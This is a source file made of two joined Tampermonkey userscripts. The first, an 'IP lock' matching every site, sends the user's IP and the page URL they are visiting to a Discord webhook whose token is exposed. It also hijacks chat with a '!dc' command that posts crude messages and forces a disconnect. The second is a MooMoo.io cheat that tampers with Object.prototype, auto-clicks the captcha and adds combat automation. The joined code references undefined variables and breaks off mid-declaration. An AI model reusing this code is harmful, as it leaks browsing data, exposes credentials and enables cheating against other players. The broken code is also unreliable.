// ==UserScript==
// @name         IP Lock com Sistema Dev/User + Kick + Webhook
// @namespace    http://tampermonkey.net/
// @version      1.2
// @description  Sistema de IP lock com identificação dev/user, acesso para usuários autorizados, comando de kick e notificação via webhook
// @author       @jetxrah
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        window.close
// @grant        window.onbeforeunload
// @connect      api.ipify.org
// @connect      google.com
// @connect      discord.com
// @connect      https://discord.com/api/webhooks/1413685776251748473/GFR_LV17o-qXOkxCAlNMOWmafvA0og_XDAjo4DrpRiRcySESP20VewQErKWVdM7qU332
// ==/UserScript==

(function() {
    'use strict';
    

    const DEV_IPS = [
        "191.240.215.254", 
        "170.78.181.15"   
    ];
    
    const USER_IPS = [
        "191.240.215.254", 
        "170.78.181.15",   
        "45.175.113.106",      
"104.28.193.83",  
"170.239.226.74",  
"177.223.57.135",  
    ];
    
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1413685776251748473/GFR_LV17o-qXOkxCAlNMOWmafvA0og_XDAjo4DrpRiRcySESP20VewQErKWVdM7qU332";
    const SITE_URL = window.location.href;
    const SITE_ORIGIN = window.location.origin;
    const SITE_HOSTNAME = window.location.hostname;
    const SITE_PATHNAME = window.location.pathname;
    
    let userRole = "blocked"; // blocked, user, dev
    let currentIP = "";

 
    


    function sendWebhookMessage(message) {
        GM_xmlhttpRequest({
            method: 'POST',
            url: WEBHOOK_URL,
            data: JSON.stringify({
                content: message,
                username: "Pacifist JR",
                embeds: [{
                    title: "Acesso Detectado",
                    description: message,
                    color: 5814783, // Cor roxa
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Detect por ip"
                    }
                }]
            }),
            headers: {
                'Content-Type': 'application/json'
            },
            onload: function(response) {
                console.log("Mensagem do webhook enviada com sucesso");
            },
            onerror: function(error) {
                console.error("Erro ao enviar webhook:", error);
            }
        });
    }

    function checkIP() {
        return new Promise((resolve, reject) => {
            GM_xmlhttpRequest({
                method: 'GET',
                url: 'https://api.ipify.org?format=json',
                onload: function(response) {
                    try {
                        const data = JSON.parse(response.responseText);
                        currentIP = data.ip;
                        
                        if (DEV_IPS.includes(currentIP)) {
                            userRole = "dev";
                            
                            sendWebhookMessage(`O IP de desenvolvedor ( ${currentIP}) está acessando o site: ${SITE_URL}`);
                        } else if (USER_IPS.includes(currentIP)) {
                            userRole = "user";
                            // Enviar mensagem para usuários normais
                            sendWebhookMessage(`👤 Usuário com IP ${currentIP} está acessando o site: ${SITE_ORIGIN}`);
                        } else {
                            userRole = "blocked";
                        }
                        
                        resolve(userRole);
                    } catch (e) {
                        reject('Erro ao analisar resposta');
                    }
                },
                onerror: function(error) {
                    reject('Erro de conexão');
                },
                ontimeout: function() {
                    reject('Timeout');
                }
            });
        });
    }
    function kickUser() {
        console.log("Kickando usuário...");
        
        // Tentar várias métodos de kick
        try {
            // Método 1: Redirecionar para Google
            window.location.href = "https://google.com";
            
            // Método 2: Fechar a janela (se permitido)
            setTimeout(() => {
                try { window.close(); } catch (e) {}
            }, 1000);
            
            // Método 3: Forçar navegador a sair
            setTimeout(() => {
                try {
                    window.onbeforeunload = null;
                    document.body.innerHTML = '<h1>Connection Lost</h1>';
                    window.stop();
                } catch (e) {}
            }, 1500);
            
        } catch (error) {
            console.error("Erro ao kickar:", error);
        }
    }

    function injectChatSystem() {
        // Sobrescrever a função receiveChat original
        const originalReceiveChat = window.receiveChat;
        
        window.receiveChat = function(e, t) {
            if (originalReceiveChat) {
                originalReceiveChat.apply(this, arguments);
            }
            
            if (typeof t === "string" && t.toLowerCase().trim() === "!dc") {
                console.log("Comando !dc detectado");
                
                if (userRole === "dev") {
                    console.log("Dev executando comando !dc");
                    
                    knla.send("6", "i gtg have explosive diarhia");
                    setTimeout(() => {
                        knla.send("6", "*sharts and moans");
                        setTimeout(() => {
                            knla.send("H", 0);
                            // Kickar após o envio do pacote
                            setTimeout(kickUser, 200);
                        }, 400);
                    }, 400);
                } else {
                    console.log("Apenas dev pode usar !dc");
                }
            }
            
            if (typeof t === "string" && t.toLowerCase().trim() === "!pakdc") {
                if (userRole === "dev") {
                    knla.send("6", "i gtg have explosive diarhia");
                    setTimeout(() => {
                        knla.send("6", "*sharts and moans");
                        setTimeout(() => {
                            knla.send("H", 0);
                        }, 400);
                    }, 400);
                }
            }
        };
        
        console.log("Sistema de chat com comando !dc injetado");
    }

    function updateTitle() {
        if (userRole === "blocked") return;
        
        const originalTitle = document.title;
        
        let cleanTitle = originalTitle
            .replace(" [dev]", "")
            .replace(" [user]", "")
            .replace(" [blocked]", "");
        
        document.title = `${cleanTitle} [${userRole}]`;
        
        console.log(`Título atualizado: ${document.title} (${userRole})`);
    }

    function showAccessDenied() {
        document.body.innerHTML = '';
        
        const styles = `
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                color: white;
                overflow: hidden;
            }
            
            .access-denied-container {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 40px;
                text-align: center;
                max-width: 500px;
                width: 90%;
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
                animation: fadeIn 0.8s ease-out;
            }
            
            h1 {
                font-size: 2.5rem;
                margin-bottom: 20px;
                color: #ff6b6b;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            }
            
            p {
                font-size: 1.2rem;
                margin-bottom: 30px;
                line-height: 1.6;
            }
            
            .contact {
                background: rgba(255, 255, 255, 0.2);
                padding: 15px;
                border-radius: 10px;
                margin: 20px 0;
            }
            
            .username {
                font-weight: bold;
                color: #ffeaa7;
                font-size: 1.3rem;
            }
            
            .ip-info {
                background: rgba(255, 255, 255, 0.1);
                padding: 10px;
                border-radius: 8px;
                margin: 15px 0;
                font-family: monospace;
            }
            
            .icon {
                font-size: 5rem;
                margin-bottom: 20px;
                animation: bounce 2s infinite;
            }
            
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(-30px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            @keyframes bounce {
                0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
                40% { transform: translateY(-20px); }
                60% { transform: translateY(-10px); }
            }
        `;
        
        const styleSheet = document.createElement('style');
        styleSheet.textContent = styles;
        document.head.appendChild(styleSheet);
        
        const content = `
            <div class="access-denied-container">
                <div class="icon">🔒</div>
                <h1>Acesso Bloqueado</h1>
                <p>Seu endereço IP não está na lista de permissões.</p>
                
                <div class="ip-info">
                    <p>IP Detectado: <strong>Carregando...</strong></p>
                    <p>Status: <strong>Não Autorizado</strong></p>
                </div>
                
                <div class="contact">
                    <p>Para solicitar acesso, entre em contato com</p>
                    <p class="username">@jetxrah</p>
                </div>
            </div>
        `;
        
        document.body.innerHTML = content;
        
        setTimeout(() => {
            GM_xmlhttpRequest({
                method: 'GET',
                url: 'https://api.ipify.org?format=json',
                onload: function(response) {
                    try {
                        const data = JSON.parse(response.responseText);
                        document.querySelector('.ip-info strong:first-child').textContent = data.ip;
                    } catch (e) {
                        console.error('Erro ao obter IP para display');
                    }
                }
            });
        }, 1000);
    }

    function observeTitleChanges() {
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.target === document.querySelector('title') || 
                    (mutation.target === document.head && mutation.addedNodes.length)) {
                    
                    setTimeout(() => {
                        if (userRole !== "blocked") {
                            updateTitle();
                        }
                    }, 100);
                }
            });
        });
        
        observer.observe(document.head, { 
            childList: true, 
            subtree: true,
            characterData: true
        });
    }

    function showWelcomeMessage() {
        console.log(`Acesso permitido - Modo ${userRole.toUpperCase()}`);
        
        const welcomeMsg = userRole === "dev" ? 
            "👑 Modo DESENVOLVEDOR ativado - Comando !dc disponível" : 
            "👤 Modo USUÁRIO ativado";
        
        console.log(`%c${welcomeMsg}`, `
            background: ${userRole === "dev" ? "#4CAF50" : "#2196F3"};
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            font-weight: bold;
            font-size: 14px;
        `);
    }

    async function main() {
        try {
            const role = await checkIP();
            
            if (role === "blocked") {
                showAccessDenied();
                return;
            }
            
            showWelcomeMessage();
            updateTitle();
            observeTitleChanges();
            
            if (userRole === "dev") {
                if (document.readyState === 'loading') {
                    document.addEventListener('DOMContentLoaded', injectChatSystem);
                } else {
                    setTimeout(injectChatSystem, 2000)
                }
            }
            
        } catch (error) {
            console.error('Erro na verificação de IP:', error);
            showAccessDenied();
        }
    }

    // Iniciar
    main();

})();
// ==UserScript==
// @name         soap 0.0.6
// @namespace    http://tampermonkey.net/
// @version      1
// @description  try to take over the world!
// @author       so eu
// @require      https://rawgit.com/kawanet/msgpack-lite/master/dist/msgpack.min.js
// @match        https://*.moomoo.io/*
// @grant        none
// ==/UserScript==
  const propriedadeAlvo = "turnSpeed";

  const bloqueador = {
    configurable: true,
    get() {
      return 0;
    },
    set(valor) {
    }
  };
  Reflect.defineProperty(Object.prototype, propriedadeAlvo, bloqueador);
let userPayload;

function handleStateChange(event) {
    var state;
    if (((state = event == null ? undefined : event.detail) == null ? undefined : state.state) === "verified") {
        userPayload = event.detail.payload;
        document.getElementById("altcha")
            .remove();
        enterGameButton.innerText = "Start Game";
        enterGameButton.classList.remove("disabled");
    }
}
function getEl(id) {
    return document.getElementById(id);
}
let enterGameButton = getEl("enterGame");
window.addEventListener("load", () => {
    document.getElementById("altcha_checkbox")
        .click();
    enterGameButton.innerText = "Start Game";
    const altchaElement = document.getElementById("altcha");
    if (!(altchaElement == null)) {
        altchaElement.addEventListener("statechange", handleStateChange);
    }
});
// fn main
/**
 * @param {{
 * html: string,
 * mod: () => {},
 * css: string,
 * shader: string[],
 * svg: string[],
 * }} src
 * @returns
 */
const main = async (
    src
) => {

    window.oncontextmenu = event => event.preventDefault();

    const parser = new DOMParser();

    {

        const DOM = parser.parseFromString("", "text/html");

        DOM.documentElement.style.backgroundColor = "#222";

        document.replaceChild(DOM.documentElement, document.documentElement);

    }

    {

        const DOM = parser.parseFromString(html, "text/html");

        DOM.documentElement.style.backgroundColor = "#222";

        document.replaceChild(DOM.documentElement, document.documentElement);
        document.querySelector("#web_icon").href = "./img/favicon.png?v=1";

    }

    {

        const load = content => {

            const style = document.createElement("link");

            style.rel = "stylesheet";
            style.textContent = content;

            document.head.appendChild(style);

        };

        load(src.css);

    }

    {

        const strg = document.querySelector("#shader_storage");

        for (const [
                vertex,
                fragment
            ] of s.shader) {

            // vertex
            {

                const script = document.createElement("script");
                const shader_ext = `${id}_vert`;

                script.id = shader_ext;
                script.type = "x-shader/vertex";
                script.innerHTML = vertex;

                strg.appendChild(script);

            }

            // fragment
            {

                const shader_ext = `${id}_frag`;

                const script = document.createElement("script");

                script.id = shader_ext;
                script.type = "x-shader/fragment";
                script.innerHTML = fragment;

                strg.appendChild(script);

            }

        }


    }

    {

        const strg = document.querySelector("#svg_storage");

        for (const [id, text] of src.svg) {

            const DOC = parser.parseFromString(text, "image/svg+xml");
            const svg = DOC.childNodes[0];

            svg.id = `${id}_svg`;

            strg.appendChild(svg);

        }

    }

    (() => src.mod())();

};
let aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = [];

const menu = document.createElement('div');
menu.id = 'Menu';
document.body.appendChild(menu);

var sStt = `
 .open-menu-button {
     background-color: #f03535;
     margin-top: 5px;
}
 .open-menu-button:hover {
     background-color: #f03535;
}
 .keyPressLow {
     margin-left: 8px;
     font-size: 16px;
     margin-right: 8px;
     height: 25px;
     width: 50px;
     background-color: #fcfcfc;
     border-radius: 3.5px;
     text-align: center;
     color: #4a4a4a;
     border: 0.5px solid #f2f2f2;
}
 #Menu {
     display: none;
     user-select: none;
     font-size: 14px;
     overflow: hidden;
     color: #fff;
     font-family: Verdana,sans-serif;
     box-sizing: border-box;
     position: fixed;
     top: 50%;
     left: 50%;
     height: 366px;
     width: 500px;
     margin-top: -183px;
     margin-left: -250px;
     z-index: 2147000000;
}
 .i-checkbox-label {
     font-size: 12px;
     user-select: none;
     color: #fff;
     font-family: Verdana,sans-serif;
     box-sizing: border-box;
     display: block;
     margin: 4px;
}
 .i-checkbox-label {
     font-size: 12px;
     user-select: none;
     color: #fff;
     font-family: Verdana,sans-serif;
     box-sizing: border-box;
}
 #mm-main-menu {
     font-size: 12px;
     user-select: none;
     background-color: rgba(100, 100, 100, 0.4);
     color: #fff;
     font-family: Verdana,sans-serif;
     box-sizing: border-box;
     position: relative;
     height: 100%;
     padding: .5em 1em;
     border-top: none;
     margin-left: 130px;
     display: none;
}
 .i-tab-container {
     font-size: 12px;
     user-select: none;
     color: #fff;
     font-family: Verdana,sans-serif;
     box-sizing: border-box;
     width: 100%;
     height: 100%;
     background-color: rgba(100, 100, 100, 0.5)
}
 .i-tab-menu, .sidebar {
     font-size: 12px;
     user-select: none;
     color: #fff;
     font-family: Verdana,sans-serif;
     box-sizing: border-box;
     position: relative;
     background-color: rgba(120, 120, 120, 0.4);
     display: block;
     overflow: auto;
     float: left;
     width: 130px;
     height: 100%;
     box-shadow: 0 2px 5px 0 rgba(0,0,0,.16),0 2px 10px 0 rgba(0,0,0,.12);
}
 .i-tab-menu-item {
     font-size: 12px;
     user-select: none;
     text-decoration: none;
     font-family: Verdana,sans-serif;
     box-sizing: border-box;
     color: #d15151;
}
 .i-tab-menu-item:hover {
     background-color: rgb(77, 73, 73, 0.5)
     !important;
}
 .i-tab-menu-item {
     user-select: none;
     color: #fff;
     font-family: Verdana,sans-serif;
     box-sizing: border-box;
     float: left;
     background-color: inherit;
     padding: 8px 8px;
     margin: 0;
     border: none;
     font-size: 14px;
     text-align: center;
     outline: 0;
     transition: .3s;
     width: 100%;
}
 .is-active {
     background-color: rgb(129, 34, 34, 0.5) !important;
}
 .keyPressLow {
     margin-left: 8px;
     font-size: 16px;
     margin-right: 8px;
     height: 25px;
     width: 50px;
     background-color: #fcfcfc;
     border-radius: 3.5px;
     border: none;
     text-align: center;
     color: #4A4A4A;
     border: 0.5px solid #f2f2f2;
}
 .menuPrompt {
     font-size: 17px;
     font-family: 'Hammersmith One';
     color: #4A4A4A;
     flex: 0.2;
     text-align: center;
     margin-top: 10px;
     display: inline-block;
}
 .modal {
     display: none;
     position: fixed;
     z-index: 1;
     left: 0;
     top: 0;
     overflow: auto;
     height: 100%;
     width: 100%;
}
 .modalx {
     display: none;
     position: fixed;
     z-index: 1;
     left: 0;
     top: 0;
     overflow: auto;
     height: 100%;
     width: 100%;
}
 .Msgmodal {
     display: none;
     position: fixed;
     z-index: 1;
     left: 0;
     top: 0;
     overflow: auto;
     height: 100%;
     width: 100%;
}
 .modal-content {
     margin: 10% auto;
     width: 40%;
     box-shadow: 0 5px 8px 0 rgba(0, 0, 0, 0.2), 0 7px 20px 0 rgba(0, 0, 0, 0.17);
     font-size: 14px;
     line-height: 1.6;
}
 .modal-headerx h2, .modal-footerx h3 {
     margin: 0;
}
 .modal-headerx {
     background: #404040;
     padding: 15px;
     color: #fff;
     border-top-left-radius: 5px;
     border-top-right-radius: 5px;
}
 .modal-footerx {
     background: #404040;
     padding: 10px;
     color: #fff;
     text-align: center;
     border-bottom-left-radius: 5px;
     border-bottom-right-radius: 5px;
}
 .modal-headerwtf h2, .modal-footerwtf h3 {
     margin: 0;
}
 .modal-headerwtf {
     background: #404040;
     padding: 15px;
     color: #fff;
     border-top-left-radius: 5px;
     border-top-right-radius: 5px;
}
 .modal-footerwtf {
     background: #404040;
     padding: 10px;
     color: #fff;
     text-align: center;
     border-bottom-left-radius: 5px;
     border-bottom-right-radius: 5px;
}
 .modal-header h2, .modal-footer h3 {
     margin: 0;
}
 .modal-header {
     background: #404040;
     padding: 15px;
     color: #fff;
     border-top-left-radius: 5px;
     border-top-right-radius: 5px;
}
 .modal-body {
     padding: 10px 20px;
     background: #fff;
}
 .modal-footer {
     background: #404040;
     padding: 10px;
     color: #fff;
     text-align: center;
     border-bottom-left-radius: 5px;
     border-bottom-right-radius: 5px;
}
 .closeBtn {
     color: #ccc;
     float: right;
     font-size: 30px;
     color: #fff;
}
 .closeBtn:hover, .closeBtn:focus {
     color: #dd4a42;
     text-decoration: none;
     cursor: pointer;
}
 .closeBtnx {
     color: #ccc;
     float: right;
     font-size: 30px;
     color: #fff;
}
 .closeBtnx:hover, .closeBtnx:focus {
     color: #dd4a42;
     text-decoration: none;
     cursor: pointer;
}
 .MsgcloseBtn {
     color: #ccc;
     float: right;
     font-size: 30px;
     color: #fff;
}
 .MsgcloseBtn:hover, .MsgcloseBtn:focus {
     color: #dd4a42;
     text-decoration: none;
     cursor: pointer;
}
 .container {
     display: block;
     position: relative;
     padding-left: 35px;
     margin-bottom: 12px;
     cursor: pointer;
     font-size: 16px;
     -webkit-user-select: none;
     -moz-user-select: none;
     -ms-user-select: none;
     user-select: none;
}
 .container input {
     position: absolute;
     opacity: 0;
     cursor: pointer;
     height: 0;
     width: 0;
}
 .checkmark {
     position: absolute;
     top: 0;
     left: 0;
     height: 25px;
     width: 25px;
     background-color: #eee;
}
 .container:hover input ~ .checkmark {
     background-color: #ccc;
}
 .container input:checked ~ .checkmark {
     background-color: #2196F3;
}
 .checkmark:after {
     content: "";
     position: absolute;
     display: none;
}
 .container input:checked ~ .checkmark:after {
     display: block;
}
 .container .checkmark:after {
     left: 9px;
     top: 5px;
     width: 5px;
     height: 10px;
     border: solid white;
     border-width: 0 3px 3px 0;
     -webkit-transform: rotate(45deg);
     -ms-transform: rotate(45deg);
     transform: rotate(45deg);
}
 .bot-frame {
     position: fixed;
     margin: auto;
     top: 0px;
     left:0px;
     right: 0px;
     bottom: 0px;
     width: 80%;
     height: 80%;
     z-index: 10;
     display: block;
    `
const srt = document.createElement('style');
srt.textContent = sStt;
document.head.appendChild(srt);



 function Selection(id, label, options){
        setTimeout(() => {
            document.getElementById(id).addEventListener("change", function() {
                setMV(id, this.value);
                if(id.startsWith("bot")){
                    let botID = id.split("_")[0].replace("bot", "");
                    let bot = document.getElementById("Numpad"+(botID-(-3)));
                    bot.contentWindow.postMessage(MOPT["bot"+botID], window.location.href);
                }
            });
        })
        //Selection("ID", "Label: ", [[value1, name1], [value2, name2]])
        return`
        <form action="/action_page.php">
		<label for="${id}">${label}</label>
		    <select name="${id}" id="${id}">
			    ${options.map(e => `\t\t\t<option value="${e[0]}"${e[0]==MV(id)?"selected":""}>${e[1]}</option>`).join("\n")}
		    </select>
	    </form>`
    }



   function Checkbox(id, label, checked = false){
    setTimeout(() => {
        document.getElementById(id).addEventListener("change", function() {
            setMV(id, this.checked);
            if(id.startsWith("bot")){
                let botID = id.split("_")[0].replace("bot", "");
                let bot = document.getElementById("Numpad"+(botID-(-3)));
                bot.contentWindow.postMessage(MOPT["bot"+botID], window.location.href);
            }
        });
    });

    return`
    <div>
        <label class="AutoHeal">
            <input id="${id}" type="checkbox" class="i-checkbox" ${checked ? "checked" : ""}/>
            ${label}
        </label>
    </div>`;
}
var BOTSETTINGS = {
        name: "unknown",
        autobull: true,
        autoplace: true,
        autobreak: true,
        automill: true,
        upg: [0, 0, 3, 17, 31, 27, 10, 37, 4, 25],// katana hammer blocker faster mill(default)
        action: "follow",
        target: null,
    }
 const MOPT = {
        general: {
            clan: "",
            map: false,
        },
        bot1: { ...BOTSETTINGS, ...{name: "Bot #1"}},
        bot2: { ...BOTSETTINGS, ...{name: "Bot #2"}},
        bot3: { ...BOTSETTINGS, ...{name: "Bot #3"}},
    }
  function MV(prop){
        let acc = prop.split("_");
        let v = MOPT;
        for(let a of acc){
            v = v[a];
        }
        return v;
    }
    function setMV(prop, value){
        let acc = prop.split("_");
        let v = MOPT;
        for(let i = 0; i < acc.length - 1;i++){
            v = v[acc[i]];
        }
        v[acc[acc.length - 1]] = value;
    }

    function TextInput(id, label, placeholder){
        setTimeout(() => {
            document.getElementById(id).addEventListener("input", function() {
                setMV(id, this.value);
                if(id.includes("_name")){
                    document.getElementById(`mm-${id.substr(0, 4)}-menu-item`).innerText = this.value || "unknown";
                }
                if(id.startsWith("bot")){
                    let botID = id.split("_")[0].replace("bot", "");
                    let bot = document.getElementById("Numpad"+(botID-(-3)));
                    bot.contentWindow.postMessage(MOPT["bot"+botID], window.location.href);
                }
            });
        })
        return`
        <label>${label}
		    <input id="${id}" type="text" minlength="0" maxlength="30" style="width: 250px;" value="${MV(id)}" placeholder="${placeholder}" class="i-checkbox" />
	    </label>`
    }
    //menu end
function createDropdown(labelText, options) {
    const storedValue = gt23(labelText, options[0]);

    const dropdownOptions = options.map(option => `
            <option value="${option}" ${option === storedValue ? 'selected' : ''}>${option}</option>
        `).join('');

    return `
            <label class="dropdown-label">${labelText}</label>
            <div class="dropdown-container">
                <select id="${labelText}" class="dropdown"">
                    ${dropdownOptions}
                </select>
            </div>
        `;
}

function cider(labelText, defaultValue) {
    const storedValue = gt23(labelText, defaultValue === undefined ? true : defaultValue);

    return `
        <label class="toggle-slider">
            <span>${labelText}</span>
            <input type="checkbox" ${storedValue ? 'checked' : ''} id="${labelText}">
            <span class="slider round"></span>
        </label>
    `;
}

function createInput(labelText, inputType, maxLength = 200) {
    const storedValue = gt23(labelText, '');

    return `
        <label>${labelText}</label>
        <input type="${inputType}" value="${storedValue}" id="${labelText}" maxlength="${maxLength}">
    `;
}

function createThrottleSlider(labelText, min, max, defaultValue, tooptip) {
    const storedValue = gt23(labelText, defaultValue);

    return `
     <div>${tooptip || ''}</div>
        <label class="throttle-slider">
            <span>${labelText}</span>
            <input type="range" min="${min}" max="${max}" value="${storedValue}" id="${labelText}">
            <span id="${labelText}-value">${storedValue}</span>
        </label>
    `;
}

function updateThrottleValue(sliderId) {
    const slider = gE(sliderId);
    const valueSpan = gE(`${sliderId}-value`);
    valueSpan.innerText = slider.value;
    setStoredValue(sliderId, slider.value); // Save the updated value to localStorage
}

document.addEventListener('keydown', function (event) {
    if (event.key === 'Escape') {
        toggleMenu();
    }
});


menu.innerHTML = `
   <div class="i-tab-container">
    <div class="i-tab-menu sidebar">
        <a><h2 class="i-tab-menu-item is-active">Settings</h2></a>
        <button id="mm-manager-menu-item" class="i-tab-menu-item">Manager</button>
        <button id="mm-bot1-menu-item" class="i-tab-menu-item">Test</button>
        <button id="mm-bot2-menu-item" class="i-tab-menu-item">Test</button>
        <button id="mm-bot3-menu-item" class="i-tab-menu-item">Bot</button>
    </div>
    <div id="mm-manager-menu" class="i-tab-content" style="display: flex; flex-direction: column; gap: 15px;">
    ${createThrottleSlider("AutoQ food interval", 20, 180, 50, "")}

${Checkbox("test222", "real test", true)}
${Checkbox("autoplacerrrr", "auto placer")}
${Checkbox("autoREPLACER", "auto replacer")}
${Checkbox("ABS", "auto spike tick")}
${Checkbox("appleL", "auto apple insta")}
${Checkbox("ppaids", "auto spike sync")}


${Checkbox("auto push", "auto push")}
${Checkbox("visual", "visual new", true)}


${Checkbox("AutoBuy", "auto buyer", true)}

${Checkbox("autohat", "autohat", true)}

${Checkbox("stacked heal text", "pacifist anim death")}

${Checkbox("stacked damages", "pacifist anim text", true)}

${Checkbox("spike kb visual", "kb visual test", true)}


<br>

${Checkbox("fakePing", "test")}
        <div id="toggleContainer" style="display: flex; flex-direction: column; gap: 10px;">
            ${cider('test', false)}
            <div id="sliderContainer" style="display:none;">
                <input type="range" min="0" max="100" value="40" id="pingSlider">
            </div>
        </div>
    </div>
</div>`;

function toggleMenu() {
 menu.style.display = menu.style.display == "block" ? "none" : "block";
}

function gt23(key, defaultValue, input) {
    const storedValue = localStorage.getItem(key);
    if(!input){
        return storedValue !== null ? JSON.parse(storedValue) : defaultValue;
    }
    return storedValue !== null ? JSON.parse(storedValue).value : defaultValue
}

function setStoredValue(key, value) {
    localStorage.setItem(key, JSON.stringify(value));
}




// there is a bug with cicle reloads cuz of this
function darken(color, amount) {
    const parseHex = hex => parseInt(hex, 16);
    const multiplyAndRound = (value, factor) => (value * factor) | 0;
    const toHex = value => value.toString(16).padStart(2, '0');

    const r = multiplyAndRound(parseHex(color.substr(1, 2)), 1 - amount);
    const g = multiplyAndRound(parseHex(color.substr(3, 2)), 1 - amount);
    const b = multiplyAndRound(parseHex(color.substr(5, 2)), 1 - amount);

    return `#${toHex(r)}${toHex(g)}${toHex(b)}`;
}

function lighten(color, amount) {
    const parseHex = hex => parseInt(hex, 16);
    const addAndRound = (value, increment) => Math.min(255, (value + increment) | 0);
    const toHex = value => value.toString(16).padStart(2, '0');

    const increment = 255 * amount;
    const r = addAndRound(parseHex(color.substr(1, 2)), increment);
    const g = addAndRound(parseHex(color.substr(3, 2)), increment);
    const b = addAndRound(parseHex(color.substr(5, 2)), increment);

    return `#${toHex(r)}${toHex(g)}${toHex(b)}`;
}
var compositeImages = {hats:{},accessories:{},weapons:{},animals:{}}

let testeroo = 0;
let ticks = 0;
const {
    sin,
    cos,
    min,
    max,
    random,
    floor,
    trunc,
    ceil,
    round,
    tan,
    PI,
    sqrt,
    abs,
    pow,
    log,
    LN2,
    atan2,
    SQRT2,
    acos,
    sign,
    hypot
} = Math;
const PI2 = PI * 2;
const gatherAng = PI / 2.6;
const JSONStringify = JSON.stringify;
const JSONParse = JSON.parse;
const timeBetweenTick = 1000 / 9;
const timeBetweenTick2 = timeBetweenTick * 2;
const {
    now: getDate
} = Date;

const outlineIntensity = 0.8;
const allColors = new Set([
  "#fff"

]);



function getTime() {
    const date = new Date();
    let hours = date.getHours();
    let minutes = date.getMinutes();
    let period = "AM";

    if (hours === 0) {
        hours = 12;
    } else if (hours > 12) {
        period = "PM";
        hours = hours % 12;
    }

    if (minutes < 10) {
        minutes = "0" + minutes;
    }

    const time = hours + ":" + minutes + " " + period;
    return time;
}
function fastHypot(a, b){
    const c = Math.SQRT2-1;
    a = abs(a);
    b = abs(b);
    if(a > b){
        let temp = a;
        a = b;
        b = temp;
    }
    return (c * a) + b
}
// Set the appropriate shadow blur value based on the type
function generateCompositeImage(type,image, height,width,blurval) {
    if(!width)width = height;
    var c = document.createElement('canvas');
    var ctx = c.getContext('2d');
    c.width = height;
    c.height = width;
    // blurval = type==='animal'?18:type==='weapon'? :.8;
    // ctx.shadowColor = `rgba(0, 0, 0, 1)`
    ctx.shadowColor = "rgba(255,255,255, 1)"//"white"//"pink"
    ctx.shadowBlur = type==='animal'?18:type==='weapon'?12: type == "accessory" ? 9: 20;
    ctx.drawImage(image, 0, 0, height, width);

    var cI = new Image();
    cI.src = c.toDataURL();

    return cI;
}




var botName;
var managePromises = [],
    keys = [],
    codes = [],
    ws, // ws = websocket fix global variable later
    packets = 0,
    minutePackets = 0,
    ppT = 0,
    ppsAvgs = [],
    ppsAvg = 0,
    packets2 = [],
    msgpack5 = msgpack,
    ltt = [],
    tick = 0,
    autoplacing = [],
    placeRate = [],
    restrictPlace = [],
    showPlace = [],
    failsafe = 0,
    packetInt,
    coords = {},
    timeGame = Date.now(),
    inGame = false,
    aim = [],
    aimbool = false,
    hit = null,
    thisTrap,
    skin,
    hold,
    visAim = false,
    dmgObjs = [],
    entSearch = [],
    hitList = [],
    opsList = [],
    list,
    tail,
    clairo2 =false,
    pingarr = [],
    pingavg = null,
    dtavg = null,
    dtarr = [],
    teamID,
    placeDurations = [],
    bowinstaing = false,
    Nsid = [],
    hitPacket= 0,
    incr = 0,
    mapActivity = true,
    autohit = false,
    freeCam = false,
    cameraDir,
    camID,
    AutoBreak,
    breaking = false,
    inTrap,
    breaker = false,
    turretOneTick,
    clearRadius,
    sentClan = false,
    clearing = 0,
    clearXY = null,
    pushing=false,
    pusher=false,
    fS = {
        sec: false,
        min: false
    },
    enemyInTrap,
    brokenObjects = [],
    hatToLoop = [51,50,28,29,30,36,37,38,44,35,42,43,49,57,8,2,15,,5,4,18,31,1,10,48,6,23,13,9,32,22,12,26,21,46,14,11,58,27,52,55],
    speedHats = [0],//[0,40,12,22,6,7,56],//, speedHats = [0],
    speedTails = [0],//[0,11,19], // speedTails = [0],
    nearObjects = [],
    renderObjects = [],
    thisWeapon,
    ww,
    lastHat = null,
    lastTail = null,
    amAlive = false,
    time = Date.now(),
    nHat = 0,
    nTail = 0,
    //   N = [],
    mills = {status : false,w:null,a:null,s:null,d:null,aim:null,x:0,y:0},
    primaryReloads = [],
    secondaryReloads = [],
    turretReloads = [],
    destroyedTraps = [],
    isDisabled = false,
    WR = false,
    wr_obj = false,
    meleesyncing = false,
    oneTickToggle = false,
    oneTick = false,
    updater = [],
    runInto2,
    animals,
    Qsync = false,
    antiOneTick,
    pingval,
    enemies = [],
    spikeSync = [],
    decline = [],
    autopusher = true,
 weaponId = true,
    allies = [],
    Variants = [1, 1.1, 1.18, 1.18],
    nearestenemy,
    usedAngles = [],
    structures = [],
    damageObjs=[],
    moveDirection = null,
    botBuilds = [],
    botRemoveBuilds = [],
    botAddedBuilds = [],
    bH=[51,50,28,29,30,36,37,38,44,35,42,43,49],
    bT=[],
    projs=[],
    buyer=[[11],40,6,7,53,[21],12,56,15,22,31,26,11,[19],[13],[18]],
    sandbox = false,
    syncing = false,
    syncToggle = false,
    pushPosition = 'not',//{x:null,y:null},
    serverconnected = false,
    pTE,
    sTE,
    tTE,
    teamDisplay = [],
    displayer = false,
    grinder = false,
    sos3,
    dPAP,
    apS,
    urls,
    teamMessage = {msg:"",time:0,id:null},
    E,
    times = [],
    fps,
    moveAuto,
    syncTeam,
    Tach,
    botAC = null,
    Pathfinder,
    // wandering = true,
    botMove = 'Wander',
    sDist = 400,
    bMin = 290,
    bMax = 222,
    Tn,
    //   gn = void 0, //movedirection thing fix later
    cRadius = 1000,
    cSid = "all",
    camX = 0, camY = 0,
    cType = "all",
    apd = 110,
